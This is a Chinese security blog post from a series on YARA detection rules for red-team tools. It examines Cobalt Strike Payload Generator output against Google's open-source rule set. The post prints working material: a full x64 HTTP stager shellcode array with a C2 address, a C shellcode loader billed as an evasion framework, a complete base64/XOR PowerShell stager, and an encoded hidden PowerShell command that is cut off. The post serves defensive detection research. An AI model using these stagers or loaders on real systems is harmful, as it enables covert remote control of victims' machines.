用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析（二）
=========================================

前言：
---

该系列文章是对 [红队知识仓库 ](https://github.com/Threekiii/Awesome-Redteam)这个高赞项目中所提到的红队工具进行 "打标"的知识分享。前面已经整理了 [用Yara 对红队工具 "打标"](https://forum.butian.net/share/1913) 、 [用 Yara 对红队工具 "打标"（二） ](https://forum.butian.net/share/1954)、[用 Yara 对红队工具 "打标"（三）——免杀类规则提取](https://forum.butian.net/share/2008)，[用 Yara 对红队工具 "打标"（三）——免杀类规则提取（二）](https://forum.butian.net/share/2016)，[用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析](https://forum.butian.net/share/2070)

这里继续跟随 [Google 云情报威胁团队开源的 YARA 规则集](https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse)，分析Stager Payload Generator 生成的部分。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-dea630784cc7b4a6a7eac58be9eef078b2e7133b.png)

环境准备：
-----

工具：Cobalt Strike 4.7

Google 开源的 YARA 规则集：[GCTI/YARA/CobaltStrike](https://github.com/chronicle/GCTI/tree/main/YARA/CobaltStrike)

Payload Generator
-----------------

Listener 我们在前面已经设置了，所以直接跳过。Payload Generator 先来看看官网怎么介绍的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-6d9e1adbf6326224c0f712712f0d6e7f915fe2e9.png)

嗯，大致的意思应该是把向 listener 发送请求的相关 beacon 的实现代码抽出来作为源码放在主机上了。由于这段 shellcode 只是发送请求用，我们需要把它放在其它免杀框架中去运行。

而在 Payload Generator 不同语言的输出类型中其实可以大致分为两种，一种是单纯的 byte 数组类型，数组内就是该 shellcode 的字节码形式，但是自己不能运行，需要自己用免杀框架加载。另一种是能独立运行的类型，且看下面分析。

### 单纯字节码数组之——C 类型举例：

比如说我生成如下 C 64 位的 Payload Generator：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7fc233f5e0b5aec0c7c5ba8e731ae9b9bc26b8c7.png)

然后代码中只有如下数组：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-4f0272476e2af2eba597e7b4fcde4ab88b2ab579.png)

> / *length: 893 bytes* /  
> unsigned char buf\[\] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x51\\x00\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x31\\x42\\x72\\x78\\x00\\x8c\\x26\\xd5\\x87\\xa1\\xf3\\x40\\x49\\x56\\xed\\xf0\\x7e\\x15\\x34\\x8c\\xaf\\x78\\xe0\\xbd\\xe4\\x5f\\x2b\\xf6\\x9d\\x6a\\x70\\x2c\\x8d\\x62\\xd1\\x5c\\xad\\xf0\\xc6\\xd4\\x14\\x47\\xbb\\xbf\\xdb\\x1a\\x42\\x96\\x40\\x1d\\xc5\\xd4\\xcb\\x08\\x8c\\xab\\x0b\\xb0\\x0f\\x12\\x6a\\x42\\xb4\\xdb\\x11\\x92\\x0a\\x5f\\x70\\x81\\x91\\xb9\\xb0\\x44\\x0d\\xe8\\x03\\xb5\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x39\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x31\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x35\\x2e\\x30\\x3b\\x20\\x46\\x75\\x6e\\x57\\x65\\x62\\x50\\x72\\x6f\\x64\\x75\\x63\\x74\\x73\\x3b\\x20\\x49\\x45\\x30\\x30\\x30\\x36\\x5f\\x76\\x65\\x72\\x31\\x3b\\x45\\x4e\\x5f\\x47\\x42\\x29\\x0d\\x0a\\x00\\x77\\x42\\xd8\\x78\\xb2\\xca\\x9a\\x8d\\xa1\\xcc\\x85\\x0e\\x0a\\xd0\\x12\\x7b\\xeb\\xa4\\x18\\x03\\xa3\\xda\\xd6\\x35\\xe2\\xde\\xda\\xa2\\x46\\x0e\\x6f\\xc3\\xec\\x1b\\xd5\\x12\\xa4\\x38\\xe8\\xac\\x03\\x75\\x2d\\xcd\\xfb\\xf5\\xc0\\x4e\\xba\\x7c\\x18\\xc1\\x66\\x3d\\x17\\x02\\x9a\\x15\\x6f\\x51\\xea\\xc9\\xda\\xcb\\x3a\\x1c\\x88\\xf7\\x0e\\xf2\\xdc\\x55\\x44\\x7b\\x80\\x46\\xad\\x6d\\xf1\\x6f\\x8f\\x2c\\x26\\x23\\xbf\\x7d\\xc0\\x89\\x1f\\xfe\\xee\\xfc\\x1d\\xa4\\x6d\\x2a\\x6c\\x94\\x21\\xcc\\x4e\\x0d\\x1c\\xbb\\x2a\\xde\\xf7\\xb7\\xf3\\x03\\xea\\x77\\x17\\xd7\\x86\\x91\\xa0\\x6f\\x5a\\x73\\x7b\\x01\\xfa\\x0a\\x54\\x16\\xea\\x0c\\xbb\\xfa\\xa2\\x57\\xe0\\x13\\xad\\xcc\\x02\\xd2\\xdc\\x90\\x67\\xc4\\xec\\xd4\\xd9\\xc9\\x7d\\x62\\x60\\x38\\x15\\x38\\x31\\x01\\x52\\xf7\\xe9\\x20\\xb6\\xe1\\xa2\\xa2\\x98\\x8b\\xf2\\xe8\\xfe\\x51\\xf3\\x02\\xad\\xd6\\x28\\xec\\x2d\\xe7\\x4a\\xf9\\x8b\\x6f\\x6c\\x52\\x0c\\xc8\\x86\\x68\\x8a\\x09\\x7b\\x53\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x33\\x32\\x2e\\x31\\x33\\x31\\x00\\x17\\x50\\x65\\xea";

解码之后可以看到有一个很熟悉的网络通信 http 数据包的字样，这在我前面的 "[用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析](https://forum.butian.net/share/2070)" 的 "包含 PowerShell 的 Html Application" 中也有提及。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-5c9fe0531642bb45c268ecd529b6142d96b9a1c8.png)

由于生成的字节码数组需要我们自己加载来运行，在官网介绍中 Cobalt Strike 是可以和 Metasploit 联动的，所以可以让 MSF 来帮忙生成一个。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f597cdb036837ee65047fbd6693675a3bb29cd6e.png)

由于我自己没用过 Metasploit ，当然这个 Cobalt Strike 也是最近才学，找了很久找到一篇有用 MSF 生成免杀框架的文章：[MSF木马的免杀(三)\_谢公子的博客-CSDN博客\_msf安卓木马免杀](https://xie1997.blog.csdn.net/article/details/106348527)。

复制到免杀加载框架如下：

```c
#include<stdio.h>
#include<windows.h>

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
unsigned char shellcode[]= 这里填shellcode;
void main(){
     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(Memory, shellcode, sizeof(shellcode));
    ((void(*)())Memory)();
}
```

然后我们用它生成 exe 就好了，这里我用的是 Vscode ，按照官网的配置 [Get Started with C++ and Mingw-w64 in Visual Studio Code](https://code.visualstudio.com/docs/cpp/config-mingw#_run-helloworldcpp) 来设置

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-75e29f406e09139834e4a13c6ef9e7cadfc7531e.png)

然后点击 RUN 就生成对应的 exe 了，双击运行即可上线。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-40eacbbe4034cb41f42263505f5cf6798980847e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-798a0f11d083ffc63af4bfc46da0162a1b5222ec.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-acf5d017770129c5989836771ba7f49eb0ab4246.png)

但是在上一篇文章中我们说过，这种核心的代码我们不应该硬碰硬，所以这种单纯生成的字节码数组我们没法做规则，它的加载器是用其它免杀工具生成框架的，而能生成免杀框架的可远远不止 Metasploit ，所以无论从哪个检测面上都不好处理，现在我们看看有多少单一生成 listener 的类型。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-aaee002f3eca036cf7361a5722658abe0d1f3943.png)

除了框起来的好像都是单一的生成数组形式 ，我把这些都整理出来看看是不是真的被 Google 给忽视了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-bf28f0f571c760f435ea3e1e781a3995e2699de6.png)

匹配结果如下，可以看到 Google 的研究人员确实不会和这种隐晦的类型硬碰硬：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-840b858226daa8dc7411a6948071907270640f40.png)

### 能独立运行的类型：

#### COM Scriptlet 类型：

COM Scriptlet 只能生成 32 位类型的，相关的知识基本没接触过，但是随便浏览一下发现和前面我在 "[用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析](https://forum.butian.net/share/2070)" 中分析的 Html Application 的 VBA 类型相似度极大。

其工作原理是先创建一个 Excel 的应用对象，然后指定注册表的键用于保存旧值和设置新值。

HKEY\_CURRENT\_USER\\Software\\Microsoft\\Office\\" &amp; objExcel.Version &amp; "\\Excel\\Security\\AccessVBOM 更改为 1 的作用是允许插入和运行宏代码。

随后是将带轻微混淆的 VBA 代码拼接起来得到要运行的核心代码，混淆的方式是通过 &amp; 符号连接由 chr 函数转换的 ascii，如：&amp;Chr(10)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-ebfa41a97b795adbc586d8b4c16194424e4da7f4.png)

然后就是运行代码和注册表归回原状。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-0c1a80bac5f93a105d441b28301ab5e2d6bc308e.png)

由于和 Html Application 的 VBA 类型太相似了，以至于该脚本匹配到了两种规则：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-3c22c40d37782249fd091e5676504668d71bad42.png)

VBS 的规则前面分析过了就不看了，我们看 Sct 的规则：

如下可以看到和 VBS 的挑选主体逻辑如 Excel.Application 到 HKEY\_CURRENT\_USER\\Software\\Microsoft\\Office\\" &amp; objExcel.Version &amp; "\\Excel\\Security\\AccessVBOM 的规则相比，Sct 规则挑选的点在于 COM 的语言标记符上面，同样的也在特征出现的位置上做了限制。

Google 挑选的标签属性我自己觉得并不是很特殊，但是搭配上位置这个点也许就会显得 "唯一" 一些，&lt;scriptlet&gt;、&lt;registration progid=、classid=、&lt;script language=\\"vbscript\\"&gt;、&lt;!\[CDATA\[ 都得按顺序排布下来，这样就构成了 Google 对 COM 类型的检测。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-226c18e0a142a24bc1d988240ffe1ab542cb0eba.png)

#### PowerShell 类型：

嗯嗯，，，先来看匹配结果吧，32 位和 64 位都匹配到 x64\_Ps1 这个规则文件了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-09d6474f814fac64c6c44da67f61bb890f668f27.png)

可这个规则文件不就是在前面 "用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析" 中分析的 Html Application 的 PowerShell 类型中第三阶段我剥离出来的文件吗：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-ba7e06ea7aa205516c26d8a3ede10559dfeb5425.png)

代码如下，实现的原理大概是 base64 + xor 35 的解密操作、动态加载函数地址、内存分配并复制等常规免杀的操作。（具体细节也请参照上篇）

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
    Param ($var_module, $var_procedure)     
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )

    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
    $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

    return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktyIyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMdmV0SSOWdgAulrUOGkDoe3nPxbBidjeSp7hjYfvaF6ADYFvFO+nKtnti8cx5r72a0+oXiQgFIWWlGHJn7fVwqdEawglvQpm6fDeeNpB1I3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TGANqTUVMc0JXSw0QGAMNbWZ3A2BvcQMRDRMNFhMUERQKLikjNhdEOY5773p9G+VH/rek6IKtTtqkh8HHDRS+5URYo0XeXv3//C9OvrpUnYEfzQP3L+4tXaf7NSzndwhKxXfISICv8VJKnwqnwMBUKVHHnY7Z0IlIRnh4QLclNbZzAmy+hQdpibmiPuqKb+zAly4Isj1uhKhEI/BXHLGxhcuyL/IVUBxyXnPYZGHg9BcGz49qGoJ42BKUbpozoy2ajG8InsC59/Z28DtAIUwj7TWBeLs11czSNqBh2+moQFfbiE+obyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhoRDRIVGw0QEQ0SEBIjNHNGyQ==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
    start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
    IEX $DoIt
}

```

#### PowerShell Command 类型：

生成出来的是两个 txt 文件，Google 规则的匹配中也没匹配到，打开来看感觉是 Html Application 的 PowerShell 的第一阶段啊：

> powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAFYASQB3AEIAVQBUAFIANwBLAGwAVwByAEMAQQBvAEMAVQBmAEUAdAA1AHEAUgBTAHYAQQB5AEsAQQBzAFAATABJAEoAQwB6ACsAOQAvAFAAZwBKAHEAVABQAFoAdQA5AGQANgB2AHUAdABZAHAAeQBtAE8AbgB1ADYAWAA3ADYAbQBaADUARwBBACsAaABXAFEANQBGAGoASQBnAFYAYQBnAEwAaABkAGcAaQBoADIAbwBFADgAMABLADUAWAByAEEAUgBRAFIAOABVAEIAOAByAFYAYgBzAHgARABkAFIATQBWADAATQBYAHIAYwBBAHYAUQBZAFIATgBGADkAMQB5ADQAcABBAEgAQgBOAC8AVgBhADQAbQBlAHEAUgA3AFIATwAzADYAcQBFAGUAdgBIAHIAUQBTAEYAOQBTAEoAOABxAFUAUQBCAEYAWQBTAEEAZgBMAHEAcQBuAEoAVgBUAGkAVgArAHIATgB2AGcAMQBkAGUAUgBjAHcAUwB2AEgAawBBADcAYQBNAFYANABvADkAcAB6AEwAdwBnAEcAMABOAE0AZAAvACsAWABMAEYAeQA2AEoASQB1AEMAagAwADMAdABqAEMARgBBAHYAagBvAEYAbgB1AEEANgBJAGEAeQBUAHgAagBWAGoAdABRAEEAUgB1AEgANAAwADkATQBCAEgAeABGADMASAA5ADIAaABpADYAMABOAEQAZABzADEAagBPADYAZQBZAE8AQgA5AFQAegByAFcASgBOAGgAcQBaAGUAUgBOAEQAUQBBAHQAZABCAHQAZQBxAGYAZgAxAGIASgA1ADEAdgA2AHAAYwBHAEgAaQBlADcARwB0AGEAcQBXAHgAdwBoADQARABjAHQAMQBxAHkAVAB4AG4AUwB3ADIAbgBPAGMAQgBxAEYAVQBWAHgANAB4AGcARABHADMAVQBXAEQAawArADAAMgB3AHMAUwB1AC8AVgAwAG4AbgBsADUASAB1AFYAUABFAGUAMgBEAFgAUQBjAHgANgArAEQATABLAHkAZQBkAEcAcABWAFAASgB4AGcAYgBIAG8AbgBEAEsAdAAxADQAcgBuAFkANwAvAG4AbABoAGYAagA2ADcAcwAwAHMAOABaAEgAagBnAFkAYgBvAEkAeABEAEIAUQBBAFAAUgAwAFQARgBCADMAQgBqAHAAdgB1AFcAQwBHAGIAQwB4AFcAagBYAEcANgBmAE8AMwBWAFIASQA3AEUAUQBHAFUAUgBEADUAeAA4AFEAWAByAEgAZQBFAEIAMQBLADcAOQB4AEgAWAByADIATwA3AHoANwA5AHAAOQBxAGEAawBnAHYAWQBEADcAdQAwAHEAMQBqADAAcABZAGEAbwBJAGkAcwBuADcAbQB4AE8ALwBBAG8AWgBTADgATwBaAG4ARAA0AGYAegBrAC8AUQBkAHkAawBmAGoAMwBFADgASABJAHkAdgBmAEsASgAxAFMAMQBnAEEAdQAyAE8AZwBLAHYAQwBPAFAANwBnAGEAdQBWAHEANgB2AG4AYwBnAGgAdwBQAEwAVQBKAGoASgAxAFMANwA0AEcAZwA2AG8AUwBDAG4AZABBAFIAagBQAEkAaQBuAGYATQBvAEEAZQBUAEwAUAAvAGsANQBiAFgAdgBSAGoATwB1AC8ATgBFAFIAZgB0AE0ANAA2AHAALwBTAGMALwBIAGcAZwBuAHAAZgBRAHMAVgA0AHEAVgAyAFQAbAB6AEoANQBpAC8AdABWAEkASABOAGMAQwBVAGIASAArADYAOQBNAHcAQQBMAGIAagBnADAASAB1ADYANQA1AGoAWABnAGgAZgArAHkAeABuAHcASABaAEIAaQBVAGYAagBJAHEAWgBpAFAAMgB2AFYAOAB3AEsAdwBCAG0AZAAwAHEAZwBXAGcAegB6ACsAcgA4AFoANgBEADMAbgBYADcASgArAGQANgBKAHMANQA3AGoATAAzAEMAbABDAEIALwBkAE8AYQBVAHcAMQBwAFYAOQBCAFgAZwBZAGYAeABPADcANQBpAG0AMQB6AFkAKwBaAHUAQQBpAGYAVAA1AGEAKwBXAFgAMwA0AHIAMwBnAE0AdQBmAHEAYwBWAHcAbgBKAGcAawArADUAMgBhAGQAMABJAEQAdQBBAHEAdABPADkAUAB6AFkATwBTAC8AMQBFAGcAVABMAFkAZgBVAGYAZAA1AFgARQBSAFkANgBwAHgAKwBoAGkANwBvAFgAOABCAE4ATAB6ADEAaAB6ADAAOABZAGwASgBUAEoAeABkAEQATQBOAGMAQwA0AEQAcAA2AEcANgBCAFMAcAAwAFkATwBSAGIAbwA1ADUAcQB6AHYAYgBoAFEALwBSAFEAVABUAG4AZABkAGYATwBTAHcAcABTAFAATwBDAFoANABwAHMATgBCAFEAdwBaAG4ASQBxAHYAKwBiAEgAMgBSAEQAQQAwAGoAMABBAGgAZAA0AFcATABxAHMAUQBvAEsAcgBiADMASABOAE8AWgArAG8AawBtADcANgBGAGwAagBWAC8AKwBEADIANQBaAHkAYwBEAGsAVwBCADEAUQBXAGsARAAwADUAagBBAG0AZwB1AFIASABWAGkANgBVAFEASQAxADcAVgBxAC8AUwBmAGkALwBXAC8AdQAvAFYAaABpAGYAbgBDAFQAaQA4AEEANQBrAGIAWAB5AEkARAA3ADMAYwAxAFEAYwBsADEATABTAEwAQwA2AFgAaAAzAGMAcwBTACsAUQBpAGgARgBFAFQASQB1AGoAMQA5AFIAaQB3AEwAYQAwAHMAWQA3AFUAcQAwADAAMQBDAE0AVgBmADIAVQB6AFkAYQA4AGsAZABoAEYASQA3ADQATwBYADYATwArAEcARgBDAGcAWgBkAGwAYQBSAGIAMABaADcATABKAEoANAArAFQARQBTAFgAWgA0AHIAUQA3AGEAQwBWAHAASQBpAGIAegBQAHMAVQBJAEYASgBaADcAQwA0AGUAOABMAFIANABmADQAUgBPAGQAZQBDADMAYQBDAHMAUwBqAGkAdQBmAGkAVABqAGkASwBCACsASgB4ADAAQgBzADEAUQB5AGkAdwBXACsAZgArAGIATwBlAGsAUAB6AFYAUwAyAGwAaQBMAFEAcwBjAFkAQwBxADMAUgBNAGgAWQBLACsAWgBGADQANwBBAHMAaABkAHcALwB4ACsARQA0ADgAYwBsAEQAQwBlAGwAMAAyADgAUAB1AHAAMQBRAEsAOAB4AEkASwAxAGIASwBZAE0ANgBnAEoAOQBtACsAWABqADUAWQAxAEcAMABjAE4AbAByAHMAcABMAFAAbABBADEAMwA1AEkATgBlAGkAcABJADYAbAB1AFQAUgB4AGwAbABqAFcAYQBVAHgAYwBjAGIAYQB4AG4AeQB6AE0AUQBZAEIAegBoAE8AawBkAGwAcQByAEMALwBsAG0AdABiAFAAegBRAFAASwBpADkAagBOAGsAUwBwAGIANAA3AEQAYgB0AHQANgBhAHUAYQBDADIATQBBADYAWgBsAGkAdQA3AEoAOQBiAEsAegBMAFcAUQBtAG0AdABWAHoAawBkAFAANgBoAEQAYgBEAFoAUABWAHQAagBWAFMATgBBAGIAYgAxAHEAdwBzAHQAUgBiAHgAbwB6AFIASABUADgAeABFADkAMQBwADUANwByAGMANABjAFMAOQBtAHMAaABtAGcANQBWAHAAaQBJAHoAMwBuAEEAdABrAEIAUgB0ADkARwBoAGEANABrAGIANwBiAFMAUABZADkATwAvAG0AbgBhAEwATABlAHcAYgBYAGMAMABIADQAeQB4AGIAWgA5AFQARgBPAHkAUAAzAGgAYgBBAEEAcwB1AE0AWQB3AGYAYgA2AGsAYQBoADYAQwBqADcAbgBOADIAYgBqAEoAbwBxACsAaQBHAEwATABlAGUAeABuAGQAbwBlADMAUgBsAHIAYgB2ACsAdQBuAGUAMwBrAFQAcAB5AHcATQArAEQAVAByAE8AVAB3AFgAZQBQAEEAbwBqAEgAbgBUADEAQgBYAFMATwBuAFoAegBwAGMAVwBzAEEATwBQAGQAeABEAE4ARABVAGMATABoAFAAWgA5AHoAMABqAEYAWQBaAG8AdABoAHYAcQBZAEIAYwBuAHUAcwBCAG0AOQB5AFgAZABQAGIAWABaAHoAVQBBADQAQQArAGMAMgA3AHcAZgBaAFIAWgBEAGIAVABtAGMAcwAvAFAAaAAxAG0AdwAvAG4AUwAzAFAAUwBhAGIAVwBXADEAQwBDAFoAegBTAGwAUwBFAEwAVABYAHYAcABhAGcAMwA1ADkAdgB6AHEAVwB1AE4AcAA0AHYANwA0AGIAQwBuAEoAdQBZAHcAOABIAG8AWgBWAFAAbABzAE8ANwBCAHcAUABtAFoAVQB0AGwAagAwAFYARwBTAGwAeQBuAEkAdwBFADUAOQA2AGoARABYAFQARABsAFoAaAByADcAUwBCAGQAWABZAEcAMQBoAG4AdQBkAHAANgB4AEMAaABEAG4AdABBAEkAeABrADcAYgB1ADUAbwA2ADYAbAA1ADUAWQBHAFUAMgA2ACsAYgBJAHYARAA1AHgAdQA1AHQAegBvAGEAMABHAGUAMABFAGIAUABkAHYAZQBaADYASABCAHIASwBOAHQAMABSADkASgB2AE8ASwAwAC8AWgBFAEgAdQBjAHIAYQBnAFcAcABPAGsAQQA4AGIAZQBtADkAQgBrAGMAZgBKAGsANwB0AGgAZABHAGYAUABFAHYANQArAE0AVgBiAFAAZABhAHkANQBUAFcAMwBWA